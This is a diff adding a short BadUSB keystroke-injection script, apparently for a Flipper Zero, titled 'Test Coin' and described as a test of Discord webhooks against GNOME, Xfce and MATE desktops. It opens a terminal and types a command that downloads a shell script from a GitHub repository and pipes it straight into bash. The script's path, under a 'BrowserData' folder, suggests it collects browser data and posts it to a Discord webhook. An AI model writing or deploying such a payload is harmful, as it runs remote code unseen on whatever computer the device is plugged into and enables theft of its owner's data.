@@ -1,0 +1,12 @@
+REM     Title: Test Coin
+
+REM     Author: MagikarpLv13
+
+REM     Description: This payload is meant to test Discord Webhooks
+
+REM     Target: GNOME, Xfce, MATE
+
+CTRL-ALT T
+DELAY 500
+STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
+ENTER
